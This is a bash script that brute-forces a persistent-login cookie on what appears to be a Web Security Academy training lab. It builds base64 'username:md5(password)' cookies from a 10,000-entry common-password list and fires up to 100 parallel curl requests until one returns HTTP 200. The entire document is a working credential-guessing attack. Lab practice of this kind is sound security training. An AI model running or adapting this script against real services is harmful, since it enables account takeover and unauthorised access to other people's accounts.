#!/bin/bash

subdomain=0ab4003104a78746c0607ac500550025
URL="https://${subdomain}.web-security-academy.net/my-account"
header="Content-Type: application/x-www-form-urlencoded"
username=$1
passwords=$(cat "../../lists/10k-most-common.txt")

totalPass=$(wc -l <<< "${passwords}" )

# clean directory

rm ./response*


function check_password() {

	guess=$1
	hash_guess=$(md5sum <(echo -n ${guess}) | cut -d " " -f1)

	cookie="Cookie: stay-logged-in=$(echo -n "${username}:${hash_guess}" | base64)"

	response=$( curl -s -w "%{http_code}\n%{time_total}" "${URL}" -H "${cookie}" )

	time_total=$( tail -n1 <<< "${response}")
	http_code=$( tail -n2 <<< "${response}" | head -n1)
	content=$(head -n -2 <<< "${response}")
	stats=($(wc <<< "${response}" ))

	if (( $(ls  | grep -c "response") == 0 )); then
		echo "${http_code} | time:${time_total} | bytes:${stats[2]} | lines:${stats[0]} | guess:${guess}"
	fi

	if (( $http_code == "200" ));then
		echo "Find it! password: $guess"
		echo "${cookie}"
		echo "$response" > response$guess.html
	fi
	

}


counter=0
maxProcess=100
for guess in $passwords; do

	counter=$(( $counter + 1 ))
	while (( $(jobs | wc -l ) > $maxProcess  )); do
		wait
	done

	if (( $(ls | grep -c "response") > 0 )); then
		break
	fi

	check_password $guess &

	echo -ne "Attemp ${counter}/${totalPass}\r"
done
